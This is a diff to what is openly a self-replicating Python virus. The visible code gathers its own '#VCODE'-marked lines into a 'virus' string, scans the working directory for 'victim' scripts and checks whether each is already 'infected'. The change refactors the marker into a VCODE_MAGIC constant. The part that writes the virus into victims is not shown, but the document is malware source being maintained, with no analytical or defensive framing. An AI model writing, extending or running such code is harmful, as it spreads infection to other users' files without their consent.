@@ -2,6 +2,8 @@
 import os                                                               #VCODE
 import sys                                                              #VCODE
                                                                         #VCODE
+VCODE_MAGIC = "#VCODE"                                                  #VCODE
+                                                                        #VCODE
 # Get a list of all files in the current working directory.             #VCODE
 dirs = os.listdir()                                                     #VCODE
                                                                         #VCODE
@@ -10,7 +12,7 @@ virus = ""                                                              #VCODE
 with open(sys.argv[0], "r") as fp:                                      #VCODE
     # Read a line, if it contains #VCODE add it to the virus.           #VCODE
     for line in fp:                                                     #VCODE
-        if(line.find("#VCODE") != -1):                                  #VCODE
+        if(line.find(VCODE_MAGIC) != -1):                               #VCODE
             virus += line                                               #VCODE
                                                                         #VCODE
 # Iterate through each file/dir.                                        #VCODE
@@ -28,7 +30,7 @@ for entry in dirs:                                                      #VCODE
         victim = fp.read()                                              #VCODE
                                                                         #VCODE
     # Do nothing if the victim is already infected.                     #VCODE
-    if(victim.find("#VCODE") != -1):                                    #VCODE
+    if(victim.find(VCODE_MAGIC) != -1):                                 #VCODE
         print("Script {} is already infected...".format(entry))         #VCODE
         continue                                                        #VCODE
                                                                         #VCODE
